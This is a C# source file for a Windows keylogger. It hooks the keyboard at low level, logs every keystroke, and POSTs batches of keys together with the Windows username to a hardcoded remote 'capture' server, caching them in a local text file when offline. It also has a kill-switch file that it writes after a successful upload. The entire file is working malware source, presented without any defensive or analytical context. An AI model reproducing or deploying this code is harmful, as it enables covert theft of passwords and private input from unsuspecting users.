using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Specialized;
using System.Net;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Reflection;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    static IList<string> logs = new List<string>();
    static string username = Environment.UserName;
    static string server = "http://2323.3232.32323.23/capture";
    static bool internet = false;
    static string writen_log = "lol.txt";

    public static void Main()
    {
        if (File.Exists(".DEAD"))
        {
            System.Windows.Forms.Application.Exit();
        }
        _hookID = SetHook(_proc);
        checkinternet();
        if (internet)
        {

        }
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    static void writekeystrokes()
    {
        string txtFilePath = "lol.txt";
        string path = txtFilePath;
        string strokes = string.Join(",", logs.ToArray());


        using (StreamWriter sw = (File.Exists(path)) ? File.AppendText(path) : File.CreateText(path))
        {
            sw.Write(strokes.Replace(",", " "));
        }
    }

    static string readkeystrokes()
    {
        string txtFilePath = "lol.txt";
        string readContents;
        using (StreamReader streamReader = new StreamReader(txtFilePath, Encoding.UTF8))
        {
            readContents = streamReader.ReadToEnd();
        }
        return readContents;
    }

    public static void selfdelete()
    {
        string txtFilePath = ".DEAD";
        string path = txtFilePath;

        using (StreamWriter sw = (File.Exists(path)) ? File.AppendText(path) : File.CreateText(path))
        {
            sw.Write("DEAD");
        }
    }

    static void send_key_strokes()
    {
        using (var wb = new WebClient())
        {
            string strokes = string.Join(",", logs.ToArray());
            string keyzz = strokes.Replace(",", "");

            if (readkeystrokes() != "")
            {
                keyzz = readkeystrokes() + keyzz;
                string createText = "";
                File.Delete(writen_log);
            }

            var data = new NameValueCollection();
            data["username"] = username;
            data["keys"] = keyzz;

            var response = wb.UploadValues(server, "POST", data);
            string responseInString = Encoding.UTF8.GetString(response);
            if (responseInString == "True")
            {
                selfdelete();
            }

        }
    }


    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public static void checkinternet()
    {
        string host = server;
        Ping p = new Ping();
        try
        {
            PingReply reply = p.Send(host, 3000);
            if (reply.Status == IPStatus.Success)
                internet = true;
        }
        catch { }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            
            int vkCode = Marshal.ReadInt32(lParam);
            object newnew = (Keys)vkCode;
            logs.Add(newnew.ToString());
            if (logs.Count() == 400)
            {
                if (internet == false)
                {
                    try
                    {
                        send_key_strokes();
                        logs.Clear();
                    }
                    catch
                    {
                        writekeystrokes();
                        logs.Clear();
                    }

                }
                else
                {
                    writekeystrokes();
                    logs.Clear();
                }
            }
            Console.WriteLine((Keys)vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

}